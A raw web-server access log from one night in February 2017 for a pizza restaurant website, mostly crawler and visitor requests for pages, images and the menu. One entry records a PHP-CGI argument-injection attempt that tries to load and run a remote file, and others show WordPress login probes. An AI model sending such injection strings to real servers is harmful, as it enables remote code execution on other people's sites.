40.77.167.28 - - [27/Feb/2017:00:00:23 -0500] "GET / HTTP/1.1" 200 10132 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
66.249.75.139 - - [27/Feb/2017:00:01:18 -0500] "GET /american-pie.JPG HTTP/1.1" 304 - www.lagourmetpizza.com "-" "Googlebot-Image/1.0" "-"
66.249.75.139 - - [27/Feb/2017:00:01:18 -0500] "GET /robots.txt HTTP/1.1" 404 1363 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
77.75.78.169 - - [27/Feb/2017:00:15:45 -0500] "GET /robots.txt HTTP/1.1" 404 1363 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" "-"
77.75.78.169 - - [27/Feb/2017:00:15:46 -0500] "GET /pizza/proddetail.php?prod=CPP HTTP/1.1" 200 8891 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" "-"
66.249.75.139 - - [27/Feb/2017:00:43:27 -0500] "GET /images/favicon.ico HTTP/1.1" 304 - www.lagourmetpizza.com "-" "Googlebot-Image/1.0" "-"
66.249.75.135 - - [27/Feb/2017:00:50:32 -0500] "GET /gyro.png HTTP/1.1" 304 - www.lagourmetpizza.com "-" "Googlebot-Image/1.0" "-"
40.77.167.28 - - [27/Feb/2017:00:50:43 -0500] "GET / HTTP/1.1" 200 10132 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
188.186.7.22 - - [27/Feb/2017:00:53:08 -0500] "GET / HTTP/1.1" 200 10132 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 YaBrowser/16.2.0.3539 Safari/537.36" "-"
188.186.7.22 - - [27/Feb/2017:00:53:09 -0500] "POST /send_contact.php HTTP/1.1" 200 369 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 YaBrowser/16.2.0.3539 Safari/537.36" "-"
107.77.199.208 - - [27/Feb/2017:01:07:53 -0500] "GET /pizza/thanks.php HTTP/1.1" 200 2929 lagourmetpizza.com "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
180.76.15.147 - - [27/Feb/2017:01:13:59 -0500] "GET /pizza/proddetail.php?prod=Cal-Zone HTTP/1.1" 200 7834 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "-"
166.137.143.107 - - [27/Feb/2017:01:15:41 -0500] "GET / HTTP/1.1" 200 10132 lagourmetpizza.com "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.143.107 - - [27/Feb/2017:01:15:41 -0500] "GET /dist/js/bootstrap.js HTTP/1.1" 200 55258 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.143.107 - - [27/Feb/2017:01:15:41 -0500] "GET /american-pie.JPG HTTP/1.1" 200 454093 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.143.107 - - [27/Feb/2017:01:15:41 -0500] "GET /dist/css/bootstrap.css HTTP/1.1" 200 124612 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.143.107 - - [27/Feb/2017:01:15:41 -0500] "GET /contact.css HTTP/1.1" 200 2988 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.143.107 - - [27/Feb/2017:01:15:41 -0500] "GET /mediterr.JPG HTTP/1.1" 200 417161 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.143.107 - - [27/Feb/2017:01:15:41 -0500] "GET /california.JPG HTTP/1.1" 301 248 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.143.107 - - [27/Feb/2017:01:15:42 -0500] "GET /gyro.png HTTP/1.1" 200 2238665 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.143.107 - - [27/Feb/2017:01:15:42 -0500] "GET /button.png HTTP/1.1" 200 6418 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.143.107 - - [27/Feb/2017:01:15:42 -0500] "GET /dist/fonts/glyphicons-halflings-regular.woff HTTP/1.1" 200 23320 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.143.107 - - [27/Feb/2017:01:15:42 -0500] "GET /menu.png HTTP/1.1" 200 134412 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.143.107 - - [27/Feb/2017:01:15:42 -0500] "GET /menu2.png HTTP/1.1" 200 163838 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.143.107 - - [27/Feb/2017:01:15:42 -0500] "GET /menu3.png HTTP/1.1" 200 177242 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.143.107 - - [27/Feb/2017:01:15:43 -0500] "GET /California.JPG HTTP/1.1" 200 420843 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.143.107 - - [27/Feb/2017:01:15:43 -0500] "GET /img/pizza/pizza.png HTTP/1.1" 200 5169384 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.143.107 - - [27/Feb/2017:01:15:43 -0500] "GET /dist/css/button.png HTTP/1.1" 404 1363 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.143.107 - - [27/Feb/2017:01:15:43 -0500] "GET /img/name.svg HTTP/1.1" 404 1363 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.143.107 - - [27/Feb/2017:01:15:43 -0500] "GET /img/email.svg HTTP/1.1" 404 1363 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
166.137.143.107 - - [27/Feb/2017:01:15:44 -0500] "GET /img/comment.svg HTTP/1.1" 404 1363 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1" "-"
40.77.167.28 - - [27/Feb/2017:01:23:54 -0500] "GET /index.html HTTP/1.1" 200 10132 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
40.77.167.28 - - [27/Feb/2017:01:24:10 -0500] "GET /american-pie.JPG HTTP/1.1" 200 454093 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
207.46.13.76 - - [27/Feb/2017:01:24:15 -0500] "GET /dist/css/bootstrap.css HTTP/1.1" 200 124612 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
207.46.13.1 - - [27/Feb/2017:01:24:24 -0500] "GET /california.JPG HTTP/1.1" 301 248 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
207.46.13.1 - - [27/Feb/2017:01:24:25 -0500] "GET /California.JPG HTTP/1.1" 200 420843 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
207.46.13.1 - - [27/Feb/2017:01:24:43 -0500] "GET /mediterr.JPG HTTP/1.1" 200 417161 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.160 - - [27/Feb/2017:01:24:57 -0500] "GET /button.png HTTP/1.1" 200 6418 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.160 - - [27/Feb/2017:01:24:57 -0500] "GET /contact.css HTTP/1.1" 200 2988 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.160 - - [27/Feb/2017:01:24:57 -0500] "GET /dist/js/bootstrap.js HTTP/1.1" 200 55258 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.160 - - [27/Feb/2017:01:24:57 -0500] "GET /gyro.png HTTP/1.1" 200 2238665 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.160 - - [27/Feb/2017:01:25:14 -0500] "GET /menu.png HTTP/1.1" 200 134412 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
180.76.15.147 - - [27/Feb/2017:01:25:46 -0500] "GET /pizza/products.php?cat=13 HTTP/1.1" 200 20583 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "-"
66.249.75.135 - - [27/Feb/2017:01:30:14 -0500] "GET / HTTP/1.1" 200 10132 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
77.75.76.170 - - [27/Feb/2017:01:39:12 -0500] "GET /robots.txt HTTP/1.1" 404 1363 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" "-"
77.75.76.170 - - [27/Feb/2017:01:39:13 -0500] "GET /pizza/products.php?cat=7 HTTP/1.1" 200 18739 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" "-"
77.75.76.170 - - [27/Feb/2017:01:52:42 -0500] "GET /robots.txt HTTP/1.1" 404 1363 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" "-"
77.75.76.170 - - [27/Feb/2017:01:52:43 -0500] "GET /pizza/products.php?cat=7 HTTP/1.1" 200 18739 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" "-"
17.142.156.207 - - [27/Feb/2017:01:57:37 -0500] "GET /robots.txt HTTP/1.1" 404 1363 lagourmetpizza.com "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" "-"
17.142.156.207 - - [27/Feb/2017:01:57:37 -0500] "GET /index.html HTTP/1.1" 200 10132 lagourmetpizza.com "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" "-"
66.249.75.139 - - [27/Feb/2017:01:59:06 -0500] "GET / HTTP/1.1" 200 10132 www.lagourmetpizza.com "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
46.161.9.19 - - [27/Feb/2017:02:04:31 -0500] "GET / HTTP/1.1" 200 10132 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36 OPR/34.0.2036.50" "-"
46.161.9.19 - - [27/Feb/2017:02:04:31 -0500] "POST /send_contact.php HTTP/1.1" 200 325 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36 OPR/34.0.2036.50" "-"
66.249.69.235 - - [27/Feb/2017:02:05:47 -0500] "GET / HTTP/1.1" 200 10132 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.69.235 - - [27/Feb/2017:02:05:49 -0500] "GET /dist/css/bootstrap.css HTTP/1.1" 200 124612 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
17.142.156.207 - - [27/Feb/2017:02:10:10 -0500] "GET /pizza/categories.php HTTP/1.1" 200 7509 lagourmetpizza.com "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" "-"
111.20.178.90 - - [27/Feb/2017:02:10:59 -0500] "GET / HTTP/1.1" 200 10132 lagourmetpizza.com "-" "Mozilla/4.0" "-"
111.20.178.90 - - [27/Feb/2017:02:11:01 -0500] "GET / HTTP/1.1" 200 10132 www.lagourmetpizza.com "-" "Mozilla/4.0" "-"
66.102.7.169 - - [27/Feb/2017:02:21:31 -0500] "GET /american-pie.JPG HTTP/1.1" 200 454093 www.lagourmetpizza.com "-" "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)" "-"
65.55.210.227 - - [27/Feb/2017:02:25:08 -0500] "GET /img/name.svg HTTP/1.1" 404 1363 lagourmetpizza.com "http://lagourmetpizza.com/index.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b" "-"
65.55.210.227 - - [27/Feb/2017:02:25:08 -0500] "GET /dist/fonts/glyphicons-halflings-regular.ttf HTTP/1.1" 200 41280 lagourmetpizza.com "http://lagourmetpizza.com/index.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b" "-"
65.55.210.227 - - [27/Feb/2017:02:25:08 -0500] "GET /dist/css/button.png HTTP/1.1" 404 1363 lagourmetpizza.com "http://lagourmetpizza.com/index.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b" "-"
65.55.210.227 - - [27/Feb/2017:02:25:08 -0500] "GET /img/email.svg HTTP/1.1" 404 1363 lagourmetpizza.com "http://lagourmetpizza.com/index.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b" "-"
65.55.210.227 - - [27/Feb/2017:02:25:08 -0500] "GET /img/pizza/pizza.png HTTP/1.1" 200 5169384 lagourmetpizza.com "http://lagourmetpizza.com/index.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b" "-"
65.55.210.227 - - [27/Feb/2017:02:25:08 -0500] "GET /img/comment.svg HTTP/1.1" 404 1363 lagourmetpizza.com "http://lagourmetpizza.com/index.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b" "-"
104.198.107.169 - - [27/Feb/2017:02:37:29 -0500] "GET /?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp://www.courtandjason.com/wp-content/plugins/pt/30.txt HTTP/1.1" 200 10132 www.lagourmetpizza.com "-" "-" "-"
66.249.75.143 - - [27/Feb/2017:02:42:17 -0500] "GET /pizza/meatball-cat.gif HTTP/1.1" 304 - www.lagourmetpizza.com "-" "Googlebot-Image/1.0" "-"
77.88.47.61 - - [27/Feb/2017:03:01:10 -0500] "GET /pizza/proddetail.php?prod=NYCheese HTTP/1.1" 200 7718 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
141.8.143.163 - - [27/Feb/2017:03:11:17 -0500] "GET /pizza/proddetail.php?prod=Wings HTTP/1.1" 200 8243 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
66.249.75.139 - - [27/Feb/2017:03:18:53 -0500] "GET / HTTP/1.1" 200 10132 www.lagourmetpizza.com "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.102.7.169 - - [27/Feb/2017:03:30:07 -0500] "GET / HTTP/1.1" 200 10132 www.lagourmetpizza.com "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" "2605:6001:e3a1:7e00:59da:806b:c009:cde9"
66.102.7.173 - - [27/Feb/2017:03:30:07 -0500] "GET /images/favicon.ico HTTP/1.1" 200 1150 www.lagourmetpizza.com "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" "2605:6001:e3a1:7e00:59da:806b:c009:cde9"
77.75.76.166 - - [27/Feb/2017:03:30:59 -0500] "GET /robots.txt HTTP/1.1" 404 1363 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" "-"
77.75.76.166 - - [27/Feb/2017:03:31:00 -0500] "GET /pizza/proddetail.php?prod=GS HTTP/1.1" 200 7762 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" "-"
141.8.143.165 - - [27/Feb/2017:03:31:28 -0500] "GET /pizza/proddetail.php?prod=Catcsalad HTTP/1.1" 200 7681 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
180.76.15.23 - - [27/Feb/2017:03:38:25 -0500] "GET /pizza/proddetail.php?prod=NYCheese HTTP/1.1" 200 7718 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "-"
93.170.130.95 - - [27/Feb/2017:04:03:22 -0500] "GET / HTTP/1.1" 200 10132 lagourmetpizza.com "http://lagourmetpizza.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0" "-"
138.197.77.70 - - [27/Feb/2017:04:10:41 -0500] "GET / HTTP/1.1" 200 10132 lagourmetpizza.com "http://lagourmetpizza.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0" "-"
138.197.77.70 - - [27/Feb/2017:04:10:51 -0500] "GET /robots.txt HTTP/1.1" 404 1363 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" "-"
138.197.77.70 - - [27/Feb/2017:04:10:59 -0500] "GET /pizza/categories.php HTTP/1.1" 200 7509 lagourmetpizza.com "http://lagourmetpizza.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14" "-"
180.76.15.143 - - [27/Feb/2017:04:11:54 -0500] "GET /pizza/products.php?cat=7 HTTP/1.1" 200 18739 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "-"
68.180.229.106 - - [27/Feb/2017:04:13:46 -0500] "GET /robots.txt HTTP/1.1" 404 1363 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" "-"
68.180.229.106 - - [27/Feb/2017:04:13:47 -0500] "GET /pizza/products.php?cat=16 HTTP/1.1" 200 13977 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" "-"
157.55.39.160 - - [27/Feb/2017:04:22:25 -0500] "GET /LAGPmenu.pdf HTTP/1.1" 200 1706552 lagourmetpizza.com "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
66.249.75.139 - - [27/Feb/2017:04:24:08 -0500] "GET / HTTP/1.1" 200 10132 www.lagourmetpizza.com "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
141.8.143.137 - - [27/Feb/2017:04:33:48 -0500] "GET /pizza/proddetail.php?prod=Cal-Zone HTTP/1.1" 200 7834 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
190.131.209.130 - - [27/Feb/2017:04:43:50 -0500] "GET / HTTP/1.1" 200 10132 lagourmetpizza.com "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_6) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.12 Safari/534.24" "-"
66.249.69.235 - - [27/Feb/2017:04:58:28 -0500] "GET /robots.txt HTTP/1.1" 404 1363 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.69.231 - - [27/Feb/2017:04:58:29 -0500] "GET / HTTP/1.1" 200 10132 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.69.235 - - [27/Feb/2017:04:58:29 -0500] "GET /pizza/proddetail.php?prod=BSalad HTTP/1.1" 200 7672 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.69.231 - - [27/Feb/2017:04:58:36 -0500] "GET /dist/css/boostrap-theme.css HTTP/1.1" 301 262 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.69.235 - - [27/Feb/2017:04:58:37 -0500] "GET /dist/css/bootstrap-theme.css HTTP/1.1" 200 14940 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
141.8.143.163 - - [27/Feb/2017:04:59:16 -0500] "GET /pizza/products.php?pg=5 HTTP/1.1" 200 29148 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
141.8.143.163 - - [27/Feb/2017:05:00:46 -0500] "GET /pizza/products.php?pg=10 HTTP/1.1" 200 57689 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
137.119.123.182 - - [27/Feb/2017:05:05:02 -0500] "GET /dist/css/bootstrap.css HTTP/1.1" 200 124612 www.lagourmetpizza.com "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G930V Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36" "-"
164.132.161.45 - - [27/Feb/2017:05:08:42 -0500] "GET /pizza/proddetail.php?prod=Otherdrinks HTTP/1.1" 200 8391 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "-"
40.77.167.28 - - [27/Feb/2017:05:11:02 -0500] "GET / HTTP/1.1" 200 10132 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
111.20.178.90 - - [27/Feb/2017:05:11:13 -0500] "GET / HTTP/1.1" 200 10132 lagourmetpizza.com "-" "Mozilla/4.0" "-"
111.20.178.90 - - [27/Feb/2017:05:11:15 -0500] "GET / HTTP/1.1" 200 10132 www.lagourmetpizza.com "-" "Mozilla/4.0" "-"
199.15.233.143 - - [27/Feb/2017:05:24:20 -0500] "GET /wp-login.php HTTP/1.1" 404 1363 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" "-"
199.15.233.143 - - [27/Feb/2017:05:24:29 -0500] "GET //wp-login.php HTTP/1.1" 404 1363 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" "-"
5.255.250.61 - - [27/Feb/2017:05:33:17 -0500] "GET /pizza/products.php?cat=24&pg=3 HTTP/1.1" 200 24313 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
77.88.47.81 - - [27/Feb/2017:05:33:21 -0500] "GET /pizza/products.php?cat=24&pg=3 HTTP/1.1" 200 24313 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
5.255.250.100 - - [27/Feb/2017:05:36:04 -0500] "GET /pizza/proddetail.php?prod=GFP HTTP/1.1" 200 8893 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
163.172.64.188 - - [27/Feb/2017:05:45:02 -0500] "GET /pizza/proddetail.php?prod=meatcalzone HTTP/1.1" 200 8329 www.lagourmetpizza.com "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "-"
173.234.164.3 - - [27/Feb/2017:05:46:38 -0500] "HEAD / HTTP/1.1" 200 - lagourmetpizza.com "http://uptime.com/lagourmetpizza.com" "Mozilla/5.0 (compatible; Uptimebot/1.0; +http://www.uptime.com/uptimebot)" "-"
51.255.65.58 - - [27/Feb/2017:05:47:21 -0500] "GET /pizza/cart.php HTTP/1.1" 200 3863 lagourmetpizza.com "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "-"
